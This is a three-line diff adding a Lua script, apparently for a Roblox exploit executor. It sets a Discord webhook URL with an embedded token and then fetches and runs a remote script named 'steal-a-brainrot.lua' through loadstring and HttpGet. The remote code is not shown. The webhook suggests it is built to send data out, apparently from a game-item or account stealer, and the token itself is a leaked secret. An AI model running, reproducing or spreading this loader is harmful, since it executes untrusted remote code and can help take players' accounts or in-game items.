@@ -1,0 +1,3 @@
+WEBHOOK = "https://discord.com/api/webhooks/1478146637527384075/ToaPzmXJD5NXtBBsrYv9AbBHWPoKJH13yANBUeeIpeLaqTOqNXMJykv1h17aWZzZ9fBp" -- PUT HERE YOUR WEBHOOK
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/steal-a-brainrot.lua"))()
